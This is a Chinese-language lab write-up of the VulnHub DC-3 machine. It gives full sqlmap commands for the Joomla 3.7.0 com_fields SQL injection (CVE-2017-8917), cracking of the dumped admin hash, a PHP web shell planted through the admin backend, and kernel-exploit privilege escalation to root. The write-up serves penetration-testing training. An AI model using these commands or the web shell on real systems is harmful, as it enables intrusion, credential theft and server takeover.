# VulnHub - DC3 靶机渗透测试

## 一、靶机信息

| 项目        | 信息                        |
| ----------- | --------------------------- |
| 靶机 IP     | `172.20.10.7`               |
| 开放端口    | `80/tcp`                    |
| Web 服务    | HTTP                        |
| CMS         | Joomla                      |
| Joomla 版本 | 3.7.0                       |
| 核心漏洞    | CVE-2017-8917（SQL 注入）   |
| 数据库      | `joomladb`                  |
| 最终目标    | 获取 Shell 并完成 root 提权 |

## 二、信息收集

### 1. 主机发现与端口扫描

确认靶机 IP：

```
172.20.10.7
```

使用 Nmap 扫描开放端口：

```
nmap -sV -sC 172.20.10.7
```

发现：

```
PORT   STATE SERVICE
80/tcp open  http
```

目前仅发现 HTTP 服务，进一步对 Web 服务进行信息收集。

<img src=".\images\01.png" alt="01" style="zoom:33%;" />

<img src=".\images\02.png" alt="01" style="zoom:33%;" />

### 2. Web 指纹识别

访问靶机 Web 页面，发现使用 Joomla CMS。

使用 JoomScan 进行 CMS 指纹识别：

```
joomscan -u http://172.20.10.7
```

识别结果：

```
[++] Joomla 3.7.0
```

**信息分析：**

Joomla 3.7.0 是一个值得重点关注的版本，存在公开的 SQL 注入漏洞 CVE-2017-8917。

<img src=".\images\03.png" alt="01" style="zoom:33%;" />

## 三、漏洞搜索与验证

### 1. Searchsploit 搜索漏洞

根据 CMS 名称和版本搜索公开漏洞：

```
searchsploit joomla | grep "3.7.0"
```

发现：

```
Joomla! 3.7.0 - 'com_fields' SQL Injection
```

漏洞位置：

```
com_fields
```

漏洞原理：

Joomla 3.7.0 的 com_fields 组件存在 SQL 注入漏洞，攻击者可以通过构造恶意请求参数，干扰后台 SQL 查询，从而获取数据库中的敏感信息。

漏洞编号：

```
CVE-2017-8917
```

## 四、SQL 注入利用（Sqlmap）

本次使用 Sqlmap 对漏洞进行自动化检测和利用。

### 1. 获取数据库信息

指定存在漏洞的参数：

```
list[fullordering]
```

执行：

```
sqlmap -u "http://172.20.10.7/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

参数说明：

- `-u`：指定目标 URL。
- `--risk=3`：设置检测风险等级。
- `--level=5`：设置检测等级。
- `--random-agent`：随机更换 User-Agent。
- `--dbs`：枚举数据库。
- `-p`：指定需要测试的参数。

获取数据库：

```
joomladb
```

### 2. 获取数据库中的表

```
sqlmap -u "http://172.20.10.7/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]
```

参数说明：

- `-D joomladb`：指定数据库。
- `--tables`：枚举数据库中的表。

发现用户表：

```
#__users
```

注意：`#__` 是 Joomla 的表前缀占位符，实际数据库中通常会使用具体的前缀。

### 3. 获取用户表字段

```
sqlmap -u "http://172.20.10.7/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' --columns -p list[fullordering]
```

参数说明：

- `-T`：指定数据表。
- `--columns`：枚举指定表中的字段。

重点发现两个字段：

```
username
password
```

### 4. 导出用户名和密码

```
sqlmap -u "http://172.20.10.7/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C 'username,password' --dump -p list[fullordering]
```

参数说明：

- `-C`：指定需要提取的字段。
- `--dump`：导出指定表或字段的数据。

获取结果：

```
username: admin

password:
$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
```

至此，成功通过 SQL 注入获取 Joomla 后台用户凭据。

## 五、密码破解

### 1. 密码哈希识别

获取的密码并不是明文，而是以 `$2y$` 开头的哈希值。

这是 bcrypt 密码哈希格式。

bcrypt 属于单向密码哈希算法，不能通过解密直接还原密码，需要使用字典进行离线猜测。

### 2. 使用 John the Ripper 破解

将获取的哈希保存到文件：

```
echo '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' > hash.txt
```

使用 John 进行破解：

```
john hash.txt
```

查看破解结果：

```
john --show hash.txt
```

成功获取密码：

```
snoopy
```

最终凭据：

```
Username: admin
Password: snoopy
```

<img src=".\images\04.png" alt="01" style="zoom:33%;" />

<img src=".\images\05.png" alt="01" style="zoom:33%;" />

## 六、获取初始 Shell

### 1. 登录 Joomla 后台

使用刚刚破解的账号密码登录 Joomla 管理后台。

```
Username: admin
Password: snoopy
```

### 2. 上传 PHP 木马

登录后台后，利用后台文件管理或模板编辑功能，在具有 PHP 执行权限的位置创建 PHP 文件。

例如，在实验环境中创建 PHP 命令执行脚本：

```
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

保存后访问对应文件：

```
http://172.20.10.7/shell.php?cmd=id
```

如果能够执行系统命令，说明已经获得 Web 命令执行能力。

进一步配置反弹 Shell，连接 Kali 监听端口，获得交互式 Shell。

**注意：** PHP 命令执行不等于完整的交互式 Shell，反弹 Shell 可以让后续 Linux 枚举和提权操作更加方便。

<img src=".\images\06.png" alt="01" style="zoom:33%;" />



## 七、Linux 信息收集与内核提权

### 1. 系统信息收集

获取 Shell 后，首先确认当前用户：

```
whoami
id
```

查看操作系统版本：

```
cat /etc/os-release
```

查看内核版本：

```
uname -a
```

查看内核详细版本：

```
uname -r
```

查看当前系统权限和可利用配置：

```
sudo -l
```

<img src=".\images\07.png" alt="01" style="zoom:33%;" />

### 2. 内核漏洞扫描

使用 Linux Exploit Suggester 等工具进行本地漏洞枚举。

扫描目的：

- 获取 Linux 内核版本。
- 识别可能存在的内核漏洞。
- 根据系统版本匹配公开的提权漏洞。
- 为后续提权提供参考。

需要注意：扫描工具给出的漏洞只是候选项，并不代表一定能够成功利用，需要结合内核版本、发行版补丁和系统架构进一步验证。

<img src=".\images\08.png" alt="01" style="zoom:33%;" />

### 3. 内核漏洞利用

根据扫描结果，选择适用于当前系统的内核提权漏洞进行验证。

执行 Exploit 后，检查当前权限：

```
whoami
id
```

最终成功获取 root 权限。

<badge color="success">提权成功</badge>

<img src=".\images\09.png" alt="01" style="zoom:33%;" />

## 八、完整渗透流程总结

```
主机发现
    ↓
Nmap 端口扫描
    ↓
发现 80 端口
    ↓
Joomla CMS 指纹识别
    ↓
JoomScan 识别版本 3.7.0
    ↓
Searchsploit 搜索公开漏洞
    ↓
发现 CVE-2017-8917
    ↓
Sqlmap 自动化 SQL 注入
    ↓
获取数据库 joomladb
    ↓
枚举 #__users 用户表
    ↓
导出 admin 密码哈希
    ↓
John 破解密码
    ↓
获得 admin / snoopy
    ↓
登录 Joomla 后台
    ↓
上传 PHP 木马
    ↓
获取初始 Shell
    ↓
Linux 系统信息收集
    ↓
Linux 内核漏洞枚举
    ↓
利用内核漏洞提权
    ↓
获取 root 权限
```

## 九、本次实战收获

1. **CMS 指纹识别：** 学会通过 JoomScan 识别 Joomla 的具体版本，并结合公开漏洞库寻找攻击入口。
2. **漏洞信息关联：** 将 CMS 版本、Searchsploit 漏洞条目和 CVE 编号联系起来，形成从信息收集到漏洞利用的思路。
3. **Sqlmap 数据库枚举：** 掌握 `--dbs`、`--tables`、`--columns`、`--dump` 等常用参数，理解数据库、数据表和字段之间的关系。
4. **密码哈希破解：** 认识 bcrypt 哈希格式，掌握使用 John the Ripper 对获取的哈希进行离线字典破解。
5. **后台权限利用：** 理解数据库凭据泄露如何进一步转化为 CMS 后台访问权限，以及后台权限与服务器命令执行之间的关系。
6. **Linux 内核提权：** 掌握从系统信息收集、漏洞枚举到提权验证的基本流程。

## 十、涉及工具

| 工具                    | 主要用途               |
| ----------------------- | ---------------------- |
| Nmap                    | 主机与端口扫描         |
| JoomScan                | Joomla 指纹识别        |
| Searchsploit            | 搜索公开漏洞           |
| Sqlmap                  | SQL 注入检测与利用     |
| John the Ripper         | 密码哈希破解           |
| Linux Exploit Suggester | Linux 本地提权漏洞枚举 |
| Kali Linux              | 渗透测试操作平台       |